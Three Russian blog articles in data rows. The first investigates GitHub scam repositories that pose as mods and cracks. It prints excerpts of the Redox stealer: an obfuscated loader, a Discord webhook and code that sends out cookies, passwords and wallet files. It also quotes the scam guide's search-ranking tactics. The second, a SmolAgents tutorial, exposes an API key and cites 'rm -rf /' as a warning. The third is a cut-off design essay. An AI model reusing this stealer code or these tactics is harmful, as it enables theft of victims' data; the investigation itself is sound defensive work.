62,Расследование аферы с GitHub: как тысячи «модов» и «кряков» крадут наши данные,Флант,"DevOps-as-a-Service, Kubernetes, обслуживание 24×7",0,"Программное обеспечение, Консалтинг и поддержка, Веб-сервисы",2025-04-10,"Просматривая статьи на тематическом форуме по социальной инженерии, я обнаружил относительно новую схему мошенничества, которая меня потрясла. На GitHub создаются тысячи репозиториев с разными штуками — от модов для Roblox и Fortnite до «взломанных» FL Studio и Photoshop.Как только вы скачиваете и запускаете любую из них, все данные с вашего компьютера собираются и отправляются на Discord-сервер, где сотни злоумышленников просматривают их в поисках закрытых ключей криптокошельков, банковских счетов и учётных данных социальных сетей, а также аккаунтов Steam и Riot Games.TL;DRЯ нашёл пошаговое руководство по созданию скам-репозиториев, разложил его по полочкам и в итоге обнаружил пару репозиториев, потенциально созданных автором руководства.Написал скрипт, который помог мне найти 1115 репозиториев, созданных по инструкциям из руководства. Менее чем у 10 % из них есть открытые Issues с жалобами, остальные выглядят просто замечательно. Я собрал их все в таблицу.Нашел распакованную версию вредоносного кода и проанализировал каждую из более чем 1000 строк. Этот обфусцированный код — версия Redox stealer, которая ищет все ценные вещи на компьютере жертвы и незаметно отправляет их на сервер Discord.ПредысторияНедавно я зашел в папку «Архив» в Telegram, чтобы найти надоедливый канал, от которого не хотел отписываться, и увидел сообщение от бота, которым пользовался:Пара слов, прежде чем продолжить:Это бот для проверки видеороликов TikTok на наличие теневых банов (да, они существуют). В своё время у меня был стартап, занимавшийся продвижением музыкантов на TikTok, и этот бот пригодился мне, когда TikTok обновил алгоритмы борьбы с ботами.Но, как я узнал недавно, он в основном используется для «арбитража трафика» на TikTok по типу фейковых криптобирж или азартных игр. Но статья не о них.Все материалы в нём преимущественно на русском языке, как и куча источников для этой статьи. Уверен, подобные схемы существуют по всему миру, просто этот Telegram-бот мне попался первым.Часть скриншотов отредактирована, прямые ссылки на некоторые источники удалены — они содержат крайне аморальную информацию, и я не хочу её распространять. Любой достаточно любопытный человек может найти все упомянутые вещи самостоятельно.Кстати, бот — хитрый промошаг, нацеленный на весьма специфическую аудиторию, которую не так-то просто зацепить со стороны. Поскольку это сообщение от бота, вы должны быть подписаны на него. Также все пользователи, которые не поставили беззвучку, получат звуковое уведомление. Думаю, показатели конверсии таких объявлений, каждое из которых стоит 150 долларов, довольно высоки.Но вернёмся к сообщению на скрине. Как и другие рекламные акции мошенников, оно ссылалось на некий форум, который выступает этакой «авторитетной платформой» в своей нише. Сообщение подразумевает, что эта конкретная «команда» внесла 10 тысяч долларов на форум, чтобы доказать, что они реальны или что-то в этом роде. Я решил заглянуть на упомянутый ресурс и был потрясён тем, что там лежит в открытом доступе.Форум «социальной инженерии»Никаких .onion, никаких KYC, никаких «Послать запрос, чтобы присоединиться». Я просто создал классическую учётную запись и смог просмотреть всё содержимое.Внутри — панель для продажи практически всего: аккаунтов на различных платформах, начиная с TikTok и заканчивая «старыми проверенными аккаунтами, потратившими $100k+ на Facebook Ads».Старые (6+ месяцев) аккаунты пользователей Instagram из США за 50 центовГораздо интереснее оказался раздел со статьями. Темы охватывают почти всё, что есть в мире «аффилиатов» — это причудливое название для видов мошенничества, в которых участвуют технический «провайдер» и «команда» людей. Задача последних — привлечь за долю в прибыли «мамонтов» на сайт.Хорошим примером служит RaaS (программа-вымогатель как услуга) (если интересно, почитайте эту статью) или криптодрейнер вроде CryptoGrab. Последний — это, по сути, мошенническая платформа, у которой при этом есть зарегистрированная компания в Великобритании, чем они не стесняются хвастаться в своей документации.Но мы здесь не для того, чтобы рассказывать о «классических» схемах, — они уже хорошо изучены специалистами и агентствами по кибербезопасности. Например, компания Abnormal недавно опубликовала расследование о CryptoGrab.Полной неожиданностью и новинкой для меня стала статья под названием:Она представляет собой очень длинную и подробную пошаговую инструкцию по созданию и распространению сотен вредоносных репозиториев GitHub, замаскированных практически под все типичные приманки: популярные игровые моды, взломанные приложения (такие как Adobe Photoshop и FL Studio) и многое другое.Изображения-приманки, созданные автором той статьиПример readme-файла репозитория с «крякнутым» FL StudioОсновной целью скрытых вредоносных скриптов является сбор так называемых логов.«Лог» — это файл с данными с компьютера жертвы, включая cookie, пароли, IP-адреса и конфиденциальные файлы. Данные собираются через распространение «стилеров» — программ для кражи информации. Это специальные программы, которые действуют в фоновом режиме, пока пользователь пытается выяснить, почему установленный им мод работает некорректно. О том, что именно собирается с компьютеров жертв, расскажу чуть позже, а сейчас позвольте кратко описать алгоритм, который предлагает автор.Создаём репозиторий со стилером: что делать и чего не делатьПолучаем вредоносный файл из определённого источника (он упомянут в статье, но давать ссылку здесь я не буду).Регистрируем или лучше покупаем десятки GitHub-аккаунтов — их продают по цене от 1,5 доллара за штуку:Загружаем малварь как zip/rar-архив или просто вставляем в README ссылку на анонимный файлообменник. Так её код не засекут автоматические проверки GitHub и его нельзя будет просмотреть на сайте.Создаём README-файл по шаблону.Разбираемся в тонкостях шаблоновАвтор рекомендует воспользоваться ChatGPT или другой большой языковой моделью, чтобы немного изменить текст README, сохранив при этом все важные моменты. В README должны быть картинки и/или видео с «настоящими» модами, а ещё лучше — ссылка на реальный репозиторий какого-нибудь известного разработчика игровых модов.Ещё нужно включить фальшивые скриншоты с VirusTotal или других сайтов, утверждающие, что расширение проверено на вредоносную активность и получило оценку 0/70:Так чего же ты ждёшь?Но самой важной частью руководства, которой автор посвятил целый раздел, являются топики (topics). Они, как утверждает автор, помогают даже репозиториям без звёзд появляться в органических поисковых запросах Google, таких как «Roblox mod» или что там ещё ищут дети.Цитата из статьи (орфография и пунктуация автора сохранены):Так-же когда топиков очень мало, перебирайте их в таком формате:capcut pro crack pc / capcut pro crack download for pc / free download capcut pro / download capcut pro crackДобавляйте в начале и в конце слова: free / download / crack / cracked / for pc / pc crack и тдДля игр используйте так-же слова: download / free / cheat(s) / hack(s) / wallhack(s) / aimbot(s) and so onТак-же когда сразу подбираете тег, сразу же проверяйте его на бан с помощью https://github.com/topics/тег — если возврашает 404, тег забанен.Автор включил примерный список топиков для Valorant Aimbot, что позволило мне сразу найти упомянутый репозиторий. Кстати, он всё ещё доступен (был на момент написания статьи. — Прим. пер.). Если в Google поискать «Valorant Aimbot», он окажется на 9-й позиции:https://github.com/SoloYasko/Aimbot-ValorantЧто скрывает rar-архивПервый же найденный репозиторий содержал зацепку, которая могла бы уберечь потенциальную жертву от того, чтобы попасться на удочку, — 2 открытых Issue на GitHub:Сразу хочу вас заверить: только этот репозиторий был «раскрыт» охотниками за троянами. Мне сразу же попался другой (почти такой же) без каких-либо Issues.Благодаря одному из этих Issues мы можем взглянуть на фактический код внутри rar-архива и на то, что он делает:Предупреждение: впереди много кодаЦель скрипта — собрать всю доступную информацию, даже базовую, такую как IP-адрес, геолокацию и имя пользователя:def globalInfo():     ip = getip()     username = os.getenv('USERNAME')     ipdatanojson = urlopen(Request(f'''https://geolocation-db.com/jsonp/{ip}''')).read().decode().replace('callback(', '').replace('})', '}')     ipdata = loads(ipdatanojson)     contry = ipdata['country_name']     contryCode = ipdata['country_code'].lower()     globalinfo = f''':flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`'''     return globalinfoДальше идёт код, связанный с Discord, — откровенно говоря, я пока не совсем понял его назначение. Но гораздо интереснее код, который следует сразу за ним:  import base64 import codecs magic = 'bXlob29rID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBp' love = 'Y3qyLzuio2gmYmRjAGN0Zmp5BQV1BQDmZwDkZmtiIxcP' god = 'eXZtQktFU1NVdjRmWW4wTElqbEJSNFZ6TVJURVBPS1ZK' destiny = 'o1qTqxAyFTD3omAZqTAfHH1XER11nHk6IQH3nKShA0Va' joy = 'rot13' trust = eval('magic') + eval('codecs.decode(love, joy)') + eval('god') + eval('codecs.decode(destiny, joy)')         eval(compile(base64.b64decode(eval('trust')), '<string>', 'exec'))  # Я вычислил это trust-значение:  trust = ""bXlob29rID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNTA0Mzc5ODI1ODQzMjQxMzgvVkpCeXZtQktFU1NVdjRmWW4wTElqbEJSNFZ6TVJURVBPS1ZKb1dGdkNlSGQ3bzNMdGNsUU1KRE11aUx6VDU3aXFuN0In""Trust-значение при base64-декодировании оказывается ссылкой на вебхук Discord: myhook = 'https://discord.com/api/webhooks/1050437982584324138/VJByvmBKESSUv4fYn0LIjlBR4VzMRTEPOKVJoWFvCeHd7o3LtclQMJDMuiLzT57iqn7B'  Все пользовательские данные, включая куки, пароли и ссылку на заархивированные конфиденциальные файлы, отправляются этому Discord-хуку:def upload(name, link):             headers = {                 'Content-Type': 'application/json',                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0' }             if name == 'wpcook':                 rb = ' | '.join((lambda .0: for da in .0: da)(cookiWords))                 # Часть кода опущена                 data = {                     'content': globalInfo(),                     'embeds': [                         {                             'title': 'Redox | Cookies Stealer',                             'description': f'''**Found**:\n{rb}\n\n**Data:**\n <a:1888_Wand_Black:957353744578781304> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [RedoxCookies.txt]({link})''', # Эти паразиты обожают анимированные эмодзи                             'color': 2895667,                             'footer': {                                 'text': 'Redox Stealer',                                 'icon_url': """",                     'username': 'Redox Stealer',                     'avatar_url': '',                     'attachments': [] }                 urlopen(Request(myhook, dumps(data).encode(), headers, **('data', 'headers'))) # Ссылка на myhook                  LoadUrlib(hook, dumps(data).encode(), headers, **('data', 'headers')) Аватар «отправителя»Оригинальное название этого скрипта — Redox, хорошо известная вредоносная программа, активно распространяемая через Telegram.Далее идёт код, который собирает куки, пароли, данные Discord и запечатывает их в формат, который впоследствии будет отправлен хуку, из базы данных SQLite.Да, Redox создаёт и запускает SQLite, собирая все данные в «красивом» виде:def getCookie(path, arg):     if not os.path.exists(path):         return None     pathC = None + arg + '/Cookies'     # Пропустил несколько строк     tempfold = None + 'wp' + ''.join((lambda .0: for i in .0: random.choice('bcdefghijklmnopqrstuvwxyz'))(range(8))) + '.db'     shutil.copy2(pathC, tempfold)     conn = sql_connect(tempfold)     cursor = conn.cursor()     cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')     data = cursor.fetchall()     cursor.close()     conn.close()     os.remove(tempfold)     pathKey = path + '/Local State'     with open(pathKey, 'r', 'utf-8', **('encoding',)) as f:                 local_state = json_loads(f.read())                 None(None, None, None)  def getPassw(path, arg):   # Почти идентичный код  def GetDiscord(path, arg):   # Почти идентичный код  def GatherZips(paths1, paths2, paths3):     thttht = []     for patt in paths1:         # Опустил кучу кода     if not len(WalletsZip) == 0:         wal = '<:ETH:975438262053257236> •  Wallets\n'         for i in WalletsZip:             wal += f'''└─ [{i[0]}]({i[1]})\n'''     if not len(WalletsZip) == 0:         ga = '<a:8593blackstar:1042395444606672927>  •  Gaming:\n'         for i in GamingZip:             ga += f'''└─ [{i[0]}]({i[1]})\n'''     if not len(OtherZip) == 0:         ot = '<a:LV1:1042397877722423368>  •  Apps\n'         for i in OtherZip:             ot += f'''└─ [{i[0]}]({i[1]})\n'''Интересна функция GatherZips — она сортирует собранные файлы по трём категориям: криптокошельки, игры и всё остальное. Это наглядно демонстрирует фокус злоумышленников: крипта, игры и связанные с ними данные.Далее идут несколько функций архивации, которые многое говорят об этом стилере:def ZipTelegram(path, arg, procc):     pathC = path     name = arg     if not os.path.exists(pathC):         return None     None.Popen(f'''taskkill /im {procc} /t /f >nul 2>&1''', True, **('shell',))     zf = ZipFile(f'''{pathC}/{name}.zip''', 'w')     for file in os.listdir(pathC):         if '.zip' not in file and 'tdummy' not in file and 'user_data' not in file and 'webview' not in file:             zf.write(pathC + '/' + file)     zf.close()     lnik = uploadToAnonfiles(f'''{pathC}/{name}.zip''')     os.remove(f'''{pathC}/{name}.zip''')     OtherZip.append([         arg,         lnik])Эта функция убивает процесс Telegram, если тот запущен, собирает связанные с ним файлы (историю чатов, медиа, настройки, токены и т. д.) и отправляет их на Anonfiles — бесплатный и анонимный файлообменный сервис, известное пристанище злоумышленников.Следующая функция, ZipFiles, довольно объёмная. Она ищет определённые данные: файлы, связанные с расширением кошелька Metamask, файлы loginusers.vdf из Steam (содержат данные учётной записи пользователя), информацию об аккаунтах Riot Games и прочее:if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:     browser = path.split('\\')[4].split('/')[1].replace(' ', '')     name = f'''Metamask_{browser}'''     pathC = path + arg if not os.path.exists(pathC):     return NoneНапример, этот сложный на вид кусок кода — всего лишь функция, которая ищет расширение Metamask для Google Chrome. nkbihfbeogaeaoehlefnkodbefgpgknn — это идентификатор расширения:https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknnИ опять все заархивированные файлы отправляются на Anonfiles.Затем идёт функция GatherAll(). Она возвращает список жёстко прописанных путей ко всевозможным ресурсам, включая папки браузеров Opera, Chrome, Brave и других. Для более быстрого сбора конфиденциальных данных в ней даже есть многопоточность.Кстати, функция uploadToAnonfiles(path) наводит на мысль, что код умышленно сделан неполным — возможно, чтобы избежать обнаружения вредоносной активности при статическом анализе. Похоже, что реальная функциональность подгружается в процессе выполнения:def uploadToAnonfiles(path):     try:         pass     finally:         return None         return FalseНаконец, мы добираемся до семейства функций Kiwi:KiwiFile ищет в директориях файлы по ключевым словам.KiwiFolder рекурсивно обходит вложенные директории.Kiwi содержит список типичных названий папок, которые нужно искать:def Kiwi():     user = temp.split('\\AppData')[0]     path2search = [         user + '/Desktop',         user + '/Downloads',         user + '/Documents']     key_wordsFolder = [         'account',         'acount',         'passw',         'secret']     key_wordsFiles = [         'passw',         'mdp',         'motdepasse',         'mot_de_passe',         'login',         'secret',         'account',         'acount',         'paypal',         'banque',         'account',         'metamask',         'wallet',         'crypto',         'exodus',         'discord',         '2fa',         'code',         'memo',         'compte',         'token',         'backup',         'secret']А вот список всех ключевых слов, то есть всех приложений, которые интересуют стилера:keyword = [     'mail',     '[coinbase](https://coinbase.com)',     '[sellix](https://sellix.io)', # Это, кстати, хакерский форум, закрытый ФБР менее месяца назад: https://www.reddit.com/r/hacking/comments/1id2rhv/nulledto_crackedio_sellixio_starkrdpio_all_gone/     '[gmail](https://gmail.com)',     '[steam](https://steam.com)',     '[discord](https://discord.com)',     '[riotgames](https://riotgames.com)',     '[youtube](https://youtube.com)',     '[instagram](https://instagram.com)',     '[tiktok](https://tiktok.com)',     '[twitter](https://twitter.com)',     '[facebook](https://facebook.com)',     'card',     '[epicgames](https://epicgames.com)',     '[spotify](https://spotify.com)',     '[yahoo](https://yahoo.com)',     '[roblox](https://roblox.com)',     '[twitch](https://twitch.com)',     '[minecraft](https://minecraft.net)',     'bank',     '[paypal](https://paypal.com)',     '[origin](https://origin.com)',     '[amazon](https://amazon.com)',     '[ebay](https://ebay.com)',     '[aliexpress](https://aliexpress.com)',     '[playstation](https://playstation.com)',     '[hbo](https://hbo.com)',     '[xbox](https://xbox.com)',     'buy',     'sell',     '[binance](https://binance.com)',     '[hotmail](https://hotmail.com)',     '[outlook](https://outlook.com)',     '[crunchyroll](https://crunchyroll.com)',     '[telegram](https://telegram.com)',     '[pornhub](https://pornhub.com)',     '[disney](https://disney.com)', # Как мило с их стороны     '[expressvpn](https://expressvpn.com)',     'crypto',     '[uber](https://uber.com)',     '[netflix](https://netflix.com)']Итак, подведём итоги раздела. Вредонос Redox, включённый в архив, выложенный на GitHub, собирает самую разную информацию на компьютере жертвы, убивает нужные процессы для маскировки и незаметно отправляет файлы на какой-то сомнительный файлообменник, а ссылки и учётные данные — на некий Discord-сервер.Оцениваем масштабы аферыРазобравшись с тем, что делает загружаемый файл, я задумался о масштабах этой операции — сколько вообще существует репозиториев с такими вредоносными rar-архивами?Прикинуть можно по данным с самого форума: автор упоминает об этом в конце своего гайда. Цитирую:Если вы очень мотивированы в этом, то создавайте больше топиков и загружайте их. Когда у вас будет 300–500 репозиториев, 10-20-30 из которых в топах, они могут приносить 50–100+ логов каждый день спокойно.Проверяйте все топики спустя 5–7 дней после залива. Если же репозиторий в бане — проверяйте все теги, — меняете забаненные и заново загружаете.Могу пожелать вам только удачи!То есть всего один человек может создать сотни таких репозиториев, а всего их сколько? Тысячи?На этом можно было бы остановиться, поскольку размах проблемы уже очевиден. Но я всё же решил получить количественную оценку.Ищем по GitHubПочти сразу родилась идея: раз есть инструкция по созданию и выбору топиков, можно просто поискать репозитории с ними. Я попробовал сделать это вручную для десяти топиков. Результат меня воодушевил: все они содержали похожие репозитории — либо с файлом README и rar-архивом, либо только с README со ссылкой «скачать», ведущей на подозрительный файлообменник.Тут я понял, что эта схема также популярна на китайских форумах по «социальной инженерии» — нашлась куча одинаковых репозиториев c README на китайском.Вот пример (уже удалён. — Прим. пер.) с парой открытых Issues (перевёл его с помощью Google Translate):Зачищаем GitHubСпустя каких-то полчаса поисков я убедился в эффективности своего подхода: репозитории с одним из упомянутых топиков с высокой долей вероятности оказывались вредоносными или по крайней мере подозрительными. Поэтому я и решил написать простой скрипт, который:Генерирует простые топики по инструкции автора: 1 base_keyword (базовое ключевое слово, например csgo или fortnite) + 1 topic_keyword (тематическое ключевое слово, например cheat, hack, aimbot), затем одно базовое + два тематических и т. д.Ищет каждый топик на GitHub, используя запрос topic:{topic}, и сохраняет все найденные репозитории в общий CSV-файл.Проверяет структуру каждого найденного репозитория на подозрительные признаки, например наличие только файла README или README + несколько файлов + архив (rar/exe/zip). Репозитории, которые не соответствуют этому паттерну, всё равно с большой долей вероятности являются вредоносными — просто, похоже, используется несколько иной подход.Для base_keywords и topic_keywords использовались примеры из руководства — как понимаете, их список можно изрядно расширить. Я этого не сделал, поскольку хотел посмотреть, сработает ли самый простой подход:base_keywords = [     ""Apex Legends"", ""CODMW"", ""cod warzone"", ""cs2"", ""dayz"", ""escape from tarkov"",     ""five m"", ""fortnite"", ""genshin impact"", ""gta v"", ""lol"", ""league of legends"",     ""minecraft"", ""overwatch"", ""pubg"", ""rainbow six siege"", ""roblox"", ""rust"",     ""valorant"", ""fl studio"", ""fruity loops"" ]  modifiers = [     ""download"", ""free"", ""crack"", ""cracked"", ""for pc"", ""pc crack"",     ""cheat"", ""cheats"", ""hack"", ""hacks"", ""wallhack"", ""aimbot"" ]Изначально я сгенерировал топики длиной не более четырёх слов и получил 38 000 возможных вариантов. Так как поисковый эндпойнт API GitHub ограничен 30 запросами в минуту, проверка всех этих вариантов с помощью скрипта заняла бы почти сутки.Поэтому я решил ограничить список: оставил по 100 комбинаций ключевых фраз для каждого из 21 приложений. Это дало 2100 топиков — более чем достаточно, чтобы выяснить, работает ли идея.Даже с самым простым скриптом вот что я получил:Все репозитории:Всего строк: 1155Строк с open_issues >= 1: 115Вредоносные репозитории (на основе файловой структуры):Всего строк: 351Строк с open_issues >= 1: 11У 115 как минимум одно открытое Issue. Несколько я посмотрел вручную — все Issues сводятся либо к «не работает» (кстати, оно и не должно, поскольку просто тянет время, пока ищет ваши данные), либо к «это скам / вредонос / RAT / вирус / ...».И это всего 10 % от найденных репозиториев! А с вредоносными дело обстоит ещё хуже — 11 из 351! Такие открытые Issues потенциально могут уберечь кого-то от скачивания и запуска вредоносного скрипта.Я собрал все репозитории в таблицу, чтобы вы могли изучить их сами:Некоторые проверил — все они сделаны под копирку по вышеупомянутому руководству.Только посмотрите на кликабельные картинки в файлах README из этих вредоносных репозиториев — жуть, согласны?ЗаключениеПуть был долгим, и он ещё не пройден до конца. Но думаю, материала уже предостаточно, чтобы обобщить всё и обсудить проблему.Меня до сих пор поражает (хотя я потихоньку привыкаю), что лежит в сети в свободном доступе без всяких Tor'ов, инвайтов или разрешений. И в то же время — как искусно всё это скрыто от большинства из нас за Telegram-ботом, рассылающим мошеннические предложения о работе, или за форумом с забавным названием.Кстати, упомянутое руководство весьма популярно на форуме. Кто-то просит совета, другие ставят плюсы автору, а третьи сетуют, что метод себя почти исчерпал: «Год назад я получал с его помощью сотни логов, но теперь развелась толпа скрипт-любителей, которые портят результаты серьёзным людям».Один пользователь ссылается на другое руководство — о том, как «распаковывать» украденные аккаунты Steam и продавать инвентарь. Полагаю, это тема для отдельной статьи.Удивительно, что Redox до ужаса прост: main.py на 1000 строк — совсем не то, что представляешь, услышав про злобный вирус, который ворует все твои секреты.Наконец, меня реально беспокоит тот факт, что системе обнаружения GitHub точно по силам отфильтровать все эти репозитории. Как минимум те, в которых Issue просто кричат: «Внимание! Это ВРЕДОНОСНОЕ ПО!» Почему они до сих пор висят у всех на виду? Было бы здорово, если бы кто-нибудь из GitHub прочёл это и забанил все репозитории из таблицы, а заодно и связанные с ними учётные записи.Ладно, статья и так уже получилась непомерно длинной. Спасибо, что дочитали! Сейчас я готовлю ещё один материал про скам и рекламу — подписывайтесь, если вам интересна эта тема.P. S.Читайте также в нашем блоге:Как GitHub заменил SourceForge в роли доминирующей платформы для хостинга кодаШифрование NFS: RPC-with-TLS как альтернатива VPNПочему GitHub на самом деле победил: история глазами сооснователя"
63,SmolAgents: или как заставить LLM работать на тебя за 30 минут,Data Feeling School,Компания,0,"Программное обеспечение, Консалтинг и поддержка",2025-04-09,"Кто такие эти ваши агенты? Представьте, что вы — настоящий папа Карло, который хочет оживить своего робота, но не простого, а на основе больших языковых моделей (LLM). Ваш робот будет не только разговаривать, но и использовать специальные инструменты, которые помогут ему взаимодействовать с сайтами, кодом и даже выполнять ваши повседневные задачи. Простыми словами, агент — это комбинация модели искусственного интеллекта (LLM) и инструментов, которые вы ему предоставляете для выполнения конкретных задач.Привет, чемпионы! В этой статье расскажу, как создать своего собственного AI-агента, который сможет помогать вам в различных задачах, и покажу это на конкретных примерах.Что за мозг у агента (LLM)?LLM (Large Language Model) — на простом языке это модель, которая отлично понимает человеческий язык и умеет генерировать осмысленные ответы. Она учится на огромных объемах текстов, что позволяет ей распознавать закономерности, структуру и даже нюансы языка, тем самым «предсказывая» наиболее подходящие ответы на ваши запросы.  Использовать LLM можно двумя способами: либо локально, если есть мощное оборудование, либо через облачные API, например, Hugging Face Serverless Inference API.Архитектура SmolAgentsSmolAgents — это легкая библиотека, созданная для быстрого запуска AI-агентов. С её помощью вы можете легко выбирать и настраивать модель и добавлять инструменты, которые нужны в вашему агенту для работы. Главный плюс — это открытый исходный код и минимализм (всего около 1000 строк кода). В SmolAgents доступны встроенные инструменты (поисковики, API и песочницы), а также возможность добавлять собственные кастомные инструменты.Быстрый старт: создаём своего первого агента Чтобы начать, нужно выполнить несколько простых шагов: Шаг 1: Создаём токен на Hugging Face Зарегистрируйтесь на сайте Hugging Face и получите свой API-токен:  Зайдите в свой профиль на Hugging Face.  Перейдите в раздел «Access Tokens».   Нажмите Create new token и создайте новый токен с нужными параметрами. 4. Получаем токен.Не беспокойтесь, токен из примера уже удален, можете не пытаться его использовать :) Шаг 2: Установка SmolAgents и авторизация Установим библиотеку: !pip install smolagents huggingface_hubАвторизуемся в Jupyter и вводим наш токен:from huggingface_hub import login login()Шаг 3: Запускаем агента Создаём агента и запускаем запрос:  from smolagents import CodeAgent, DuckDuckGoSearchTool, HfApiModel  agent = CodeAgent(tools=[DuckDuckGoSearchTool()], model=HfApiModel())  agent.run(""how many people are on the planet in 2025?"")Здесь мы сделали всё просто и быстро:CodeAgent — агент, который может выполнять код и взаимодействовать с инструментами.DuckDuckGoSearchTool — инструмент для поиска информации через DuckDuckGo.HfApiModel — модель для работы с API, по умолчанию используется Qwen/Qwen2.5-Coder-32B-Instruct.Запускаем агента, которому мы дали возможность использовать поисковик для анализа и формирования ответа. Поисковик предоставляет данные для LLM, которая обрабатывает их и формулирует итоговый ответ.В результате мы получаем логи, где и находится наш ответ:Теперь представим, что вы захотели сделать бота, который будет максимально удобно для вас автоматизировать задачу! Да-да, своего собственного микро-джуна! Мы можем дать нашему агенту возможность не только писать код, но и запускать его и даже отлаживать. Однако тут важно быть осторожным! Представьте, вы дали агенту доступ писать код на вашем сервере. Что если он ошибётся и начнёт удалять всё подряд случайно сделав       sudo rm --no-preserve-root -rf /? Чтобы не получить проблем с сервером или даже законом (а мы ведь не хотим, чтобы Интерпол грел вам паяльник, верно?), мы ограничиваем его возможности специальной песочницей: Безопасность прежде всего: работа через песочницу Представьте, что вы доверили агенту писать код на вашем сервере, а он случайно его удалил! Чтобы избежать таких ситуаций, используем песочницу (например, e2b). Данная песочница позволяет через API обращаться к агенту, создавать изолированную среду, в которой он сможет выполнять задачи, писать код и даже переписывать его, если что-то не получилось с первого раза. Шаги настройки песочницы:Установите библиотеку с поддержкой песочницы:!pip install 'smolagents[e2b]'Далее мы настраиваем наш токен (который тоже уже удален, не пытайтесь 🙂)import os e2b_key = 'e2b_96c1413f742cec69151c8ae70e53d03040288e4e'  os.environ[""E2B_API_KEY""] = 'e2b_96c1413f742cec69151c8ae70e53d03040288e4e'Теперь создаём агента в безопасной среде. Очень захотелось распарсить сайт днс и посмотреть на параметры микрофона да ещё и получить таблицу.agent = CodeAgent(                model=HfApiModel(),                executor_type=""e2b""                )   agent.run(""you can parse the site by the link          ""https://www.dns-shop.ru/product/dd21d7c6a4c33330/mikrofon-boya-by-m1-cernyj/""          ""and return me the result in df?"")В результате агент самостоятельно написал код без тулзы от поисковика и получил данные после парсинга: Что в итоге? SmolAgents — очень простая и удобная библиотека для старта с AI-агентами. Однако стоит помнить, что использование API может потребовать финансовых затрат. Если не хотите платить за API-токены и желаете полностью локальное решение, то это тоже возможно! Если интересно узнать, как развернуть SmolAgents локально, не тратя ни копейки на токены, а также получить доступ к дополнительным функциям и удобному интерфейсу, поставьте лайк — и я подготовлю вторую часть статьи! 🔥 Технологии вроде SmolAgents уже трансформируют подход к автоматизации — присоединяйтесь к нашему Telegram-сообществу @datafeeling, чтобы быть на передовой этих изменений и применять всё это первыми на практике.Там мы делимся не только новыми инструментами, но и кейсами, инсайтами и рассказываем, как всё это применимо к реальным задачам.Создавайте своих робобуратино и не забывайте делиться результатами в комментариях. Мы рядом и всегда на связи!"
64,"8 кусочков промдизайн пиццы, которые ИИ, возможно, не сожрёт",ПК Аквариус,Компания,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-09,"ВведениеКаждый день мы пользуемся разными вещами вокруг нас. Взаимодействуем мы с ними определенным образом — тыкаем, двигаем, открываем, регулируем, защелкиванием, фиксируем и так далее. Выглядят эти вещи тоже определенным образом.Задумывались ли Вы когда‑нибудь, почему это так? Все эти нюансы продумываются в процессе промышленного дизайна (промдизайна).Про автораПривет!Меня зовут Альберт. Я руковожу дизайн студией в компании Аквариус. Наша команда исследует и разрабатывает опыт пользователя, разрабатывает дизайн интерфейсов, корпусов устройств, упаковки, информационных наклеек и другой мелочи для наших продуктов.В моем дизайн пути большое место занимает опыт в промышленном дизайне. Это направление довольно специфично и не так распространено, как другие виды дизайна (графический, интерьерный, интерфейсный). Чтобы в двух словах объяснить, кто такой промышленный дизайнер, можно сказать, что это кто‑то средний между дизайнером и конструктором.При знакомстве с командами меня часто просят рассказать, что такое промышленный дизайн и постепенно собрался специальный материал на эту тему. Я решил его оформить в виде статьи для Хабра, которое расскажет, что это за профессия, чем она занимается и с какими проблемами разбирается.Для кого статьяСтатья будет полезна студентам, молодым специалистам по направлению промдизайна, а также всем тем, кто хотел бы узнать, какая профессия продумывает дизайн окружающих нас вещей.Промдизайн пиццаНачнем рассказ с промдизайн пиццы состоящей из 8 кусков. С помощью нее наглядно демонстрируется набор атрибутов, из которых состоит промышленный дизайн.Промдизайн пиццаХоть все кусочки и важны при разработке промдизайна, для меня есть определенная приоритизация. Я расставил куски согласно моему восприятию важности по убыванию. Другая приоритизация не является неправильной, а зависит от дизайнера и проекта в котором он работает.1. Пользовательский опыт (UX)Это всё о юзабилити (удобство пользования), заботе о пользователе, о том, чтобы сделать всё максимально удобно и понятно.Пользователь, взяв вещь в руки, не должен чувствовать себя неуклюжим и глупым. Иногда, когда люди чувствуют себя неловко при взаимодействии с вещью, они ругают себя за то, что не могут разобраться, как этим пользоваться, тогда как правильнее ругать дизайнеров, которые создали эту вещь такой непонятной — им следовало лучше проработать UX.Конечно, непонятность вещи не всегда связана с тем, что дизайнеры не докрутили UX, потому что есть еще 7 кусков промдизайн пиццы.Не понимающий пользователь2. СтайлингСтайлинг — внешнее оформление вещи — придание какого‑то настроения и стиля. Стайлинг часто связан с модой и трендами. Например, сейчас модно добавлять различные цветовые акценты, использовать рифленые поверхности, большие фаски и наносить крупную типографику на поверхностях. Здесь главное не переусердствовать, потому что мода и тренды быстро меняются и вещь через некоторое время рискует выглядеть устаревшей.Стайлинг и UX часто становятся важной частью концепт дизайнов, которыми любят мечтать и хвастаться многие производители на международных выставках. Ведь стайлинг — это то, что способно вызвать эмоции в самом начале, когда человек увидел концепт, а благодаря UX человек продолжает испытывать эмоции при взаимодействии с ним.Концепт дизайн — это часть этапа промышленного дизайна и раскатанную губу концепта закатывают оставшиеся 6 кусков промдизайн пиццы.3. Конструкция и компоновкаПромдизайнеру важно понимать технологичность — насколько дешево и быстро производима деталь, как она собирается и фиксируется. Именно понимание технологичности вещи отличает промдизайнера действительного от промдизайнера часто принятого. Промдзиайнер не просто рисует, как ему хочется, а думает, как нарисовать так, чтобы это могло дойти до производства с минимальными правками.Раньше, кстати, мысль о более инженерной роли промышленного дизайнера надо было объяснять всегда, потому что частый диалог был следующий:— кем работаешь? 🙂— промышленным дизайнером 😎— а.. рисуешь?! 🤩— … 😐Рисующие промдизайнерыСейчас ситуация другая. Про промышленных дизайнеров знают чуть больше и даже связывают их деятельность с 3D моделированием, что действительно является одним из важных хард скилов. Раньше на собеседованиях, например, часто приходилось доказывать понимание технологичности и производства. Работодатели боялись, что общаются с 3D художником, который что‑то нарисует и это будет невозможно произвести. А бывали и другие ситуации, когда некоторые наоборот считали, что промдизайнеры и есть 3D художники 